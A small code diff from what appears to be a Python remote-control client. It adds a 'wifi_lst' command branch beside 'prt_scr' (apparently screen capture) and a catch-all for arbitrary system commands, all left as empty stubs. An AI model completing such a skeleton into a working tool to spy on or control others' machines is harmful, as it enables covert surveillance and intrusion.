@@ -34,6 +34,8 @@ def run(host, port):
                 pass
             elif command[:7] == "prt_scr":
                 pass
+            elif command == "wifi_lst":
+                pass
             else: # * Run Other System Commands
                 pass
     except:
